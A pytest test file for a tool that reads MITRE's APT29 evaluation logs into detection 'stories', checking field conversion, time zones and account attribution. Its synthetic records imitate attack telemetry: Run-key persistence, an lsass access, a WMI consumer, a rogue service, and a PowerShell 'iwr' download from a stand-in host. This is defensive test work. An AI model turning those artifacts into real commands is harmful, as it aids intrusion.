"""
tools/apt29_stories.py: MITRE's APT29 evaluation, as OTRF's Security-Datasets recorded it in NXLog
JSON, read into stories through the server path.

The conversion and the checks are tested on synthetic records on every run. The stories are tested
on the recording itself, which is not in the repository: fetch and unzip it as the tool's docstring
says, then

    REMN_APT29=/path/to/apt29 .venv/bin/python -m pytest -m heavy tests/backend/test_apt29_stories.py

Day 1 takes about a minute, most of it reading the 196,081 records; day 2 (587,286 records), when
its JSON is in the same folder, about four more.
"""

from __future__ import annotations

import datetime as dt
import hashlib
import json
import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))

import apt29_stories as A  # noqa: E402

from services.parsers.evtx_parser import flatten  # noqa: E402

DATA = Path(os.environ["REMN_APT29"]) if os.environ.get("REMN_APT29") else None
SID = "S-1-5-21-1111111111-2222222222-3333333333-1105"


def _ms(iso: str) -> int:
    return int(dt.datetime.fromisoformat(iso).timestamp() * 1000)


def _nxlog(**fields) -> dict:
    """A synthetic NXLog record: the collector's own fields first, as NXLog mixes them with the event's."""
    base = {
        "EventTime": "2020-05-01 23:10:05",
        "EventReceivedTime": "2020-05-01 23:10:06",
        "@timestamp": "2020-05-02T03:10:06.500Z",
        "@version": "1",
        "host": "collector.example.test",
        "port": 60737,
        "tags": ["lab"],
        "SourceModuleName": "eventlog",
        "SourceModuleType": "im_msvistalog",
        "Hostname": "WS-01.example.test",
        "RecordNumber": 42,
        "ThreadID": 7,
        "ExecutionProcessID": 700,
        "Version": 2,
        "OpcodeValue": 0,
        "Opcode": "Info",
        "Task": 12544,
        "Category": "Logon",
        "SeverityValue": 2,
        "Severity": "INFO",
        "EventType": "INFO",
        # the account NXLog resolved the header's UserID to
        "UserID": SID,
        "AccountName": "alice",
        "AccountType": "User",
        "Domain": "EXAMPLE",
    }
    return {**base, **fields}


def test_the_collector_fields_go_back_into_system_and_its_local_time_to_utc():
    rec = _nxlog(
        SourceName="Microsoft-Windows-Security-Auditing",
        ProviderGuid="{54849625-5478-4994-A5BA-3E3B0328C30D}",
        EventID=4624,
        Channel="security",
        EventType="AUDIT_SUCCESS",
        Keywords=-9214364837600034816,
        UserID=None,
        AccountName=None,
        Domain="NT AUTHORITY",
        Message="An account was successfully logged on.",
        TargetUserName="bob",
        TargetDomainName="EXAMPLE",
        TargetUserSid=SID,
        LogonType="3",
        IpAddress="10.0.0.5",
    )
    row = flatten(A.nxlog_event(rec), include_raw=False)
    # EventTime is US Eastern daylight time
    assert row["ts"] == _ms("2020-05-02T03:10:05+00:00")
    assert (row["channel"], row["computer"], row["recordId"], row["eventId"]) == ("Security", "WS-01.example.test", 42, 4624)
    assert (row["keywords"], row["level"], row["task"], row["processId"], row["threadId"]) == ("0x8020000000000000", 0, 12544, 700, 7)
    # the event's own domain, not the one NXLog resolved; NXLog's AccountName is no service account
    assert (row["targetUser"], row["targetDomain"], row["logonType"], row["ipAddress"]) == ("bob", "EXAMPLE", 3, "10.0.0.5")
    assert "serviceAccount" not in row
    assert not set(row["data"]) & A.NXLOG_FIELDS


def test_a_script_block_keeps_the_sid_of_its_header_and_not_the_name_nxlog_gave_it():
    rec = _nxlog(
        SourceName="Microsoft-Windows-PowerShell",
        EventID=4104,
        Channel="Microsoft-Windows-PowerShell/Operational",
        SeverityValue=3,
        EventType="WARNING",
        Keywords=0,
        ScriptBlockText="Get-Process",
        MessageNumber="1",
        MessageTotal="1",
        ScriptBlockId="0943f7fe-0000-0000-0000-000000000000",
    )
    row = flatten(A.nxlog_event(rec), include_raw=False)
    assert (row["userSid"], row["level"], row["scriptBlockText"]) == (SID, 3, "Get-Process")
    assert "alice" not in json.dumps(row)


def test_a_sysmon_record_keeps_its_own_time_and_the_fields_of_its_message():
    message = (
        "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 03:09:58.250\r\n"
        "ProcessGuid: {00000000-0000-0000-0000-000000000001}\r\nProcessId: 4242\r\nImage: C:\\Windows\\System32\\reg.exe\r\n"
        "TargetObject: HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater\r\nDetails: C:\\Users\\alice\\updater.exe"
    )
    rec = _nxlog(
        SourceName="Microsoft-Windows-Sysmon",
        EventID=13,
        Channel="Microsoft-Windows-Sysmon/Operational",
        Keywords=-9223372036854775808,
        UserID="S-1-5-18",
        Message=message,
        # NXLog's EventType took the name of Sysmon's
        EventType="INFO",
        UtcTime="2020-05-02 03:09:58.250",
        TargetObject="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater",
        Image="C:\\Windows\\System32\\reg.exe",
        ProcessId="4242",
        Details="C:\\Users\\alice\\updater.exe",
        ProcessGuid="{00000000-0000-0000-0000-000000000001}",
        RuleName="-",
    )
    event = A.nxlog_event(rec)
    row = flatten(event, include_raw=False)
    assert row["ts"] == _ms("2020-05-02T03:09:58.250+00:00")
    assert (row["eventType"], row["image"], row["callerProcessId"]) == ("SetValue", "C:\\Windows\\System32\\reg.exe", "4242")
    # in the order of the schema, as an .evtx gives them
    assert list(event["Event"]["EventData"]) == ["RuleName", "EventType", "UtcTime", "ProcessGuid", "ProcessId", "Image", "TargetObject", "Details"]
    # a ProcessId the collector added to a record whose schema has none is dropped
    access = _nxlog(
        SourceName="Microsoft-Windows-Sysmon",
        EventID=10,
        Channel="Microsoft-Windows-Sysmon/Operational",
        UtcTime="2020-05-02 03:09:58.250",
        Message="Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-05-02 03:09:58.250\r\nSourceProcessId: 900\r\nSourceImage: C:\\a.exe\r\nTargetImage: C:\\Windows\\System32\\lsass.exe\r\nGrantedAccess: 0x1010",
        SourceProcessId="900",
        ProcessId="900",
        SourceImage="C:\\a.exe",
        TargetImage="C:\\Windows\\System32\\lsass.exe",
        GrantedAccess="0x1010",
        RuleName="-",
    )
    row = flatten(A.nxlog_event(access), include_raw=False)
    assert "ProcessId" not in row["data"] and "callerProcessId" not in row
    assert (row["sourceProcessId"], row["grantedAccess"]) == ("900", "0x1010")


def test_what_nxlog_kept_only_in_the_message_is_read_back():
    def row_of(**fields):
        return flatten(A.nxlog_event(_nxlog(**fields)), include_raw=False)

    rdp = row_of(
        SourceName="Microsoft-Windows-TerminalServices-RemoteConnectionManager",
        EventID=1149,
        Channel="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
        Message="Remote Desktop Services: User authentication succeeded:\r\n\r\nUser: bob\r\nDomain: example\r\nSource Network Address: 10.0.0.9",
    )
    assert (rdp["targetUser"], rdp["targetDomain"], rdp["ipAddress"]) == ("bob", "example", "10.0.0.9")
    session = row_of(
        SourceName="Microsoft-Windows-TerminalServices-LocalSessionManager",
        EventID=21,
        Channel="Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        Message="Remote Desktop Services: Session logon succeeded:\r\n\r\nUser: EXAMPLE\\bob\r\nSession ID: 3\r\nSource Network Address: 10.0.0.9",
    )
    assert (session["user"], session["sessionId"], session["ipAddress"]) == ("EXAMPLE\\bob", 3, "10.0.0.9")
    binding = row_of(
        SourceName="Microsoft-Windows-WMI-Activity",
        EventID=5861,
        Channel="Microsoft-Windows-WMI-Activity/Operational",
        Message='Namespace = //./root/subscription; Eventfilter = Updater (refer to its activate eventid:5859); Consumer = CommandLineEventConsumer="Updater"; PossibleCause = Binding EventFilter: \ninstance of __EventFilter\n{\n\tName = "Updater";\n};',
    )
    assert (binding["data"]["ESS"], binding["data"]["CONSUMER"]) == ("Updater", 'CommandLineEventConsumer="Updater"')
    failure = row_of(
        SourceName="Microsoft-Windows-WMI-Activity",
        EventID=5858,
        Channel="Microsoft-Windows-WMI-Activity/Operational",
        Message="Id = {1}; ClientMachine = WS-02; User = EXAMPLE\\bob; ClientProcessId = 1588; Component = Unknown; Operation = Start IWbemServices::ExecQuery - root\\cimv2 : select * from Win32_Process; ResultCode = 0x80041017; PossibleCause = Unknown",
    )
    assert (failure["data"]["ClientMachine"], failure["user"], failure["status"]) == ("WS-02", "EXAMPLE\\bob", "0x80041017")
    service = row_of(
        SourceName="Service Control Manager",
        EventID=7045,
        Channel="System",
        Message="A service was installed in the system.\r\n\r\nService Name:  Updater\r\nService File Name:  C:\\Windows\\updater.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem",
        ServiceName="Updater",
        ImagePath="C:\\Windows\\updater.exe",
    )
    assert (service["serviceName"], service["serviceAccount"]) == ("Updater", "LocalSystem")
    pipeline = row_of(
        SourceName="PowerShell",
        EventID=800,
        Channel="Windows PowerShell",
        UserID=None,
        Message="Pipeline execution details for command line: iwr http://example.test/a.ps1 . \r\n\r\nContext Information: \r\n\tHostApplication=powershell -nop",
    )
    assert "HostApplication=powershell -nop" in pipeline["message"]


def test_the_rows_of_a_file_carry_its_digest_and_the_clock_check(tmp_path):
    records = [
        _nxlog(
            SourceName="Microsoft-Windows-Sysmon",
            EventID=1,
            Channel="Microsoft-Windows-Sysmon/Operational",
            EventTime="2020-05-01 23:10:05",
            UtcTime="2020-05-02 03:10:04.900",
            Message="Process Create:\r\nUtcTime: 2020-05-02 03:10:04.900\r\nImage: C:\\Windows\\System32\\cmd.exe",
            Image="C:\\Windows\\System32\\cmd.exe",
        ),
        _nxlog(SourceName="Microsoft-Windows-Security-Auditing", EventID=4634, Channel="Security", RecordNumber=43, EventType="AUDIT_SUCCESS"),
    ]
    path = tmp_path / "day.json"
    path.write_text("".join(json.dumps(r) + "\n" for r in records), encoding="utf-8")
    conv = A.Conversion(path.name)
    rows = list(A.nxlog_rows(path, conv))
    assert len(rows) == conv.records == 2
    assert conv.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()
    assert (conv.sysmon, conv.sysmon_agree, conv.out_of_order) == (1, 1, 0)
    assert rows[0]["sourceFile"] == "day.json" and rows[0]["raw"]


def _story(
    sid: str, kind: str, label: str, hosts: list[str], severity: str = "high", steps: tuple[tuple[str, str], ...] = (), campaigns: tuple[str, ...] = ()
) -> dict:
    return {
        "id": sid,
        "kind": kind,
        "subject": {"kind": kind, "label": label},
        "hosts": hosts,
        "severity": severity,
        "campaigns": list(campaigns),
        "steps": [{"host": h, "tie": {"kind": tie}, "refs": [f"event:{i}"]} for i, (h, tie) in enumerate(steps)],
        "lineage": {"hops": []},
    }


def test_the_checks_name_what_is_wrong():
    result = {
        "stories": [
            _story("a", "person", "alice@example.test", ["ws-01", "ws-02"], steps=(("ws-01", "flag"), ("ws-02", "flag"))),
            _story("b", "person", "s-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052", ["ws-01"], "medium"),
            _story("c", "person", "NT SERVICE\\mpssvc", ["ws-01"], "medium"),
            _story("d", "host", "DC-01.example.test", ["dc-01"]),
            _story("e", "host", "WS-01.example.test", ["ws-01"], steps=(("ws-01", "flag"),)),
        ],
        "campaigns": [],
    }
    subjects = A.system_subjects(result)
    assert not subjects.ok and "s-1-5-80-" in subjects.detail and "NT SERVICE\\mpssvc" in subjects.detail and "alice" not in subjects.detail
    quiet = A.quiet_hosts(result, ("dc-01",))
    assert not quiet.ok and quiet.detail == "DC-01.example.test (high)"
    split = A.one_intrusion(result, ("ws-01", "ws-02"))
    assert not split.ok and split.detail.startswith("2 stories, not linked")
    for s in result["stories"][::4]:
        s["incident"] = "incident-1"
    assert A.one_intrusion(result, ("ws-01", "ws-02")).detail.startswith("2 stories in one incident")
    for s in result["stories"][::4]:
        s["incident"], s["campaigns"] = None, ["campaign-1"]
    assert A.one_intrusion(result, ("ws-01", "ws-02")).ok
    assert not A.reaches_through_hop(result, "alice", "ws-02").ok
    result["stories"][0]["lineage"]["hops"] = [{"kind": "rdp", "from": {"host": "ws-01"}, "to": "ws-02"}]
    assert A.reaches_through_hop(result, "alice", "ws-02").detail == "rdp"
    # a script block goes with the account whose SID its header names
    out = {
        "accounts": [{"sid": SID, "name": "alice", "domain": "EXAMPLE"}],
        "scriptBlocks": [{"id": 0, "computer": "WS-01.example.test", "userSid": SID}],
        "result": result,
    }
    assert A.script_blocks_with_their_person(out, "alice", ("ws-01",)).detail == "1 of 1 in alice's story"
    out["scriptBlocks"][0]["id"] = 7
    lost = A.script_blocks_with_their_person(out, "alice", ("ws-01",))
    assert not lost.ok and lost.detail == "0 of 1 in alice's story; the others in no story 1"


# ---------------------------------------------------------------------------
# The recording itself (REMN_APT29, pytest -m heavy)
# ---------------------------------------------------------------------------
def _has(day: int) -> bool:
    return DATA is not None and (DATA / A.DAYS[day]["json"]).is_file()


needs_day1 = pytest.mark.skipif(not _has(1), reason="set REMN_APT29 to the folder holding the unzipped APT29 day-1 JSON")
needs_day2 = pytest.mark.skipif(not _has(2), reason="set REMN_APT29 to the folder holding the unzipped APT29 day-2 JSON")


@pytest.fixture(scope="module")
def day1(tmp_path_factory):
    return A.run(DATA / A.DAYS[1]["json"], work=tmp_path_factory.mktemp("apt29-day1"))


@pytest.fixture(scope="module")
def day2(tmp_path_factory):
    return A.run(DATA / A.DAYS[2]["json"], work=tmp_path_factory.mktemp("apt29-day2"))


def _check(c: A.Check) -> None:
    assert c.ok, f"{c.name}: {c.detail}"


@pytest.mark.heavy
@needs_day1
def test_day1_is_read_whole(day1):
    conv = day1["conversion"]
    assert conv.sha256 == A.DAYS[1]["jsonSha256"]
    assert conv.records == 196_081 and len(conv.hosts) == 4
    # the collector's clock is EDT: Sysmon's own times agree with it on every record
    assert conv.sysmon_agree == conv.sysmon > 140_000
    assert not day1["ruleErrors"]
    assert A.person_story(day1["result"], A.VICTIM)


@pytest.mark.heavy
@needs_day1
def test_day1_no_story_is_about_a_sid_or_a_service_account(day1):
    _check(A.system_subjects(day1["result"]))


@pytest.mark.heavy
@needs_day1
def test_day1_pbeesly_script_blocks_are_in_pbeesly_story(day1):
    _check(A.script_blocks_with_their_person(day1))


@pytest.mark.heavy
@needs_day1
def test_day1_pbeesly_reaches_nashua_through_a_hop(day1):
    _check(A.reaches_through_hop(day1["result"]))


@pytest.mark.heavy
@needs_day1
def test_day1_newyork_and_utica_raise_no_high_story(day1):
    _check(A.quiet_hosts(day1["result"]))


@pytest.mark.heavy
@needs_day1
def test_day1_reads_as_one_intrusion(day1):
    _check(A.one_intrusion(day1["result"]))


@pytest.mark.heavy
@needs_day2
def test_day2_is_read_whole(day2):
    conv = day2["conversion"]
    assert conv.sha256 == A.DAYS[2]["jsonSha256"]
    assert conv.records == 587_286 and len(conv.hosts) == 4
    assert conv.sysmon_agree == conv.sysmon
    assert not day2["ruleErrors"]
    assert day2["result"]["stories"]


@pytest.mark.heavy
@needs_day2
def test_day2_no_story_is_about_a_sid_or_a_service_account(day2):
    _check(A.system_subjects(day2["result"]))
